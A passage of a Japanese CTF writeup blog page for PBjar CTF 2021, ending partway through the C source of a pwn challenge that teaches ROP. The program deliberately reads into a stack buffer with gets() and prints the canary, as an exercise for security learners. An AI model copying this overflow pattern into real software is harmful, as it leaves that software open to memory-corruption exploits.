@@ -1,0 +1,2244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>PBjar CTF 2021 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.pbjar.net/challenges 3207点を獲得し、88位でした。 今回は、チャレンジ文のスクリーンショットを使います。 （イベント中に撮ったので" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/pbjar_ctf_2021/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="PBjar CTF 2021 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.pbjar.net/challenges 3207点を獲得し、88位でした。 今回は、チャレンジ文のスクリーンショットを使います。 （イベント中に撮ったので" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/pbjar_ctf_2021/" />
+<meta property="article:published_time" content="2021-09-20T22:00:00+09:00" />
+<meta property="article:modified_time" content="2021-09-20T22:00:00+09:00" />
+<meta itemprop="name" content="PBjar CTF 2021 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.pbjar.net/challenges 3207点を獲得し、88位でした。 今回は、チャレンジ文のスクリーンショットを使います。 （イベント中に撮ったので">
+<meta itemprop="datePublished" content="2021-09-20T22:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2021-09-20T22:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="6438">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PBjar CTF 2021 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.pbjar.net/challenges 3207点を獲得し、88位でした。 今回は、チャレンジ文のスクリーンショットを使います。 （イベント中に撮ったので"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">PBjar CTF 2021 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-09-20 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn-walkthrough">[Pwn]: Walkthrough</a>
+      <ul>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-ret2libc">[Pwn]: Ret2Libc</a>
+      <ul>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-fmtstr">[Pwn]: FmtStr</a>
+      <ul>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-discord-plz-1-point">[Misc]: discord plz (1 point)</a>
+      <ul>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-miner">[Misc]: miner</a>
+      <ul>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-readflag1">[Misc]: readFlag1</a>
+      <ul>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-readflag2">[Misc]: readFlag2</a>
+      <ul>
+        <li><a href="#solution-6">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto-convert">[Crypto]: Convert</a>
+      <ul>
+        <li><a href="#solution-7">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto-reallynotsecurealgorithm">[Crypto]: ReallynotSecureAlgorithm</a>
+      <ul>
+        <li><a href="#solution-8">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#rev-polymer">[Rev]: polymer</a>
+      <ul>
+        <li><a href="#solution-9">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-corl">[Web]: cOrL</a>
+      <ul>
+        <li><a href="#solution-10">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-hack-nasa-with-html-mr-inspector-sherlock">[Web]: Hack NASA With HTML Mr. Inspector Sherlock</a>
+      <ul>
+        <li><a href="#solution-11">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-stegosaurus-stenops">[Forensics]: Stegosaurus stenops</a>
+      <ul>
+        <li><a href="#solution-12">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-wirf-die-gläser-an-die-wand">[Forensics]: Wirf die Gläser an die Wand</a>
+      <ul>
+        <li><a href="#solution-13">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpbjar_ctf_2021%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://ctf.pbjar.net/challenges">https://ctf.pbjar.net/challenges</a>
+<br /><br />
+3207点を獲得し、88位でした。</p>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_score.png" alt="pbjar_CTF_2021_score.png">
+<br>
+今回は、チャレンジ文のスクリーンショットを使います。<br>
+（イベント中に撮ったので、solvesの数字は途中のものです。）
+<p><br /><br />
+<br /><br /></p>
+<h2 id="pwn-walkthrough">[Pwn]: Walkthrough</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_pwn1.png" alt="pbjar_CTF_2021_pwn1.png">
+<p>ソースコードも添付されています。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span><span class="lnt">253
+</span><span class="lnt">254
+</span><span class="lnt">255
+</span><span class="lnt">256
+</span><span class="lnt">257
+</span><span class="lnt">258
+</span><span class="lnt">259
+</span><span class="lnt">260
+</span><span class="lnt">261
+</span><span class="lnt">262
+</span><span class="lnt">263
+</span><span class="lnt">264
+</span><span class="lnt">265
+</span><span class="lnt">266
+</span><span class="lnt">267
+</span><span class="lnt">268
+</span><span class="lnt">269
+</span><span class="lnt">270
+</span><span class="lnt">271
+</span><span class="lnt">272
+</span><span class="lnt">273
+</span><span class="lnt">274
+</span><span class="lnt">275
+</span><span class="lnt">276
+</span><span class="lnt">277
+</span><span class="lnt">278
+</span><span class="lnt">279
+</span><span class="lnt">280
+</span><span class="lnt">281
+</span><span class="lnt">282
+</span><span class="lnt">283
+</span><span class="lnt">284
+</span><span class="lnt">285
+</span><span class="lnt">286
+</span><span class="lnt">287
+</span><span class="lnt">288
+</span><span class="lnt">289
+</span><span class="lnt">290
+</span><span class="lnt">291
+</span><span class="lnt">292
+</span><span class="lnt">293
+</span><span class="lnt">294
+</span><span class="lnt">295
+</span><span class="lnt">296
+</span><span class="lnt">297
+</span><span class="lnt">298
+</span><span class="lnt">299
+</span><span class="lnt">300
+</span><span class="lnt">301
+</span><span class="lnt">302
+</span><span class="lnt">303
+</span><span class="lnt">304
+</span><span class="lnt">305
+</span><span class="lnt">306
+</span><span class="lnt">307
+</span><span class="lnt">308
+</span><span class="lnt">309
+</span><span class="lnt">310
+</span><span class="lnt">311
+</span><span class="lnt">312
+</span><span class="lnt">313
+</span><span class="lnt">314
+</span><span class="lnt">315
+</span><span class="lnt">316
+</span><span class="lnt">317
+</span><span class="lnt">318
+</span><span class="lnt">319
+</span><span class="lnt">320
+</span><span class="lnt">321
+</span><span class="lnt">322
+</span><span class="lnt">323
+</span><span class="lnt">324
+</span><span class="lnt">325
+</span><span class="lnt">326
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">divide</span><span class="p">(){</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;---------------------------------------------------------------------------------------</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">ascii</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;   ▄███████▄  ▄█     █▄  ███▄▄▄▄   &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  ███    ███ ███     ███ ███▀▀▀██▄ &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  ███    ███ ███     ███ ███   ███ &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  ███    ███ ███     ███ ███   ███ &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;▀█████████▀  ███     ███ ███   ███ &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  ███        ███     ███ ███   ███ &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;  ███        ███ ▄█▄ ███ ███   ███ &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34; ▄████▀       ▀███▀███▀   ▀█   █▀  </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">intro</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;INTRO:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Welcome to my pwn walkthrough program.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;I hope to make pwn a little more approachable, so this problem will guide you in basic rop and format string.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">info</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;INFO:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;To start out, to run this program, you will need to use some sort of linux distribution.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;If you are on windows, you can use wsl or vmware, I personally use vmware.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;To use vmware, you need to search for some linux distribution image online and follow instructions on how to set up the vm.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Once you have that set up, you will want to use a python script with the pwntools library to create an exploit.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You can read the documentation at https://docs.pwntools.com/en/stable/about.html.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You may also want to use a command called checksec to see what conditions the elf binary has.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Also, though you won&#39;t necessarily need it for this problem, you will likely use gdb a lot.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Using an extension to visualize stack, registers, and memory data can be very helpful.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;I reccomend gdb peda, which you can read about at https://github.com/longld/peda.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Similarly, though you won&#39;t need it for this program, a program called Ghidra is very important in both pwn and rev.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;It disassembles elf binaries so you can read the source code even when it is not given.&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You can download it at https://ghidra-sre.org.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Now to get started!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">dashdiv</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;- - - - - - - - - - - - - - - - - - - - - - -&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">stkstrt</span><span class="p">(){</span>
+	<span class="n">dashdiv</span><span class="p">();</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;- - - - - - - - - - Stack - - - - - - - - - -&#34;</span><span class="p">);</span>
+	<span class="n">dashdiv</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">stk</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">mes</span><span class="p">){</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%04d| 0x%llx -&gt; %016llx %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">idx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="n">buf</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="n">mes</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">stkend</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;...&#34;</span><span class="p">);</span>
+	<span class="n">dashdiv</span><span class="p">();</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;- - - - - - - - - End stack - - - - - - - - -&#34;</span><span class="p">);</span>
+	<span class="n">dashdiv</span><span class="p">();</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">rop</span><span class="p">(){</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x40</span><span class="p">];</span>
+	
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;ROP:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\&#34;</span><span class="s">Roppity hoppity, this is now my property.</span><span class="se">\&#34;\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;In rop, you want to take control of the program by overwriting the return address on the stack.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;First, here is the canary value (what is canary explained later): 0x%llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">((</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="mh">0x9</span><span class="p">]);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Now, input something into the char buf array, and I will show you what that looks like on the stack.&#34;</span><span class="p">);</span>
+
+	<span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="c1">//here is the overflow vuln, rest is info
+</span><span class="c1"></span>	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+
+	<span class="n">stkstrt</span><span class="p">();</span>
+	
+	<span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="s">&#34;(buf strt)&#34;</span><span class="p">);</span>
+	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x7</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">,</span> <span class="s">&#34;(buf end)&#34;</span><span class="p">);</span>
+	
+	<span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="s">&#34;(canary)&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="s">&#34;(rop func base ptr)&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="s">&#34;(rop func return ptr)&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="s">&#34;(main func base ptr)&#34;</span><span class="p">);</span>
+	<span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="s">&#34;(main func return ptr)&#34;</span><span class="p">);</span>
+
+	<span class="n">stk</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="s">&#34;(stack continues below with stuff we don&#39;t care abt)&#34;</span><span class="p">);</span>
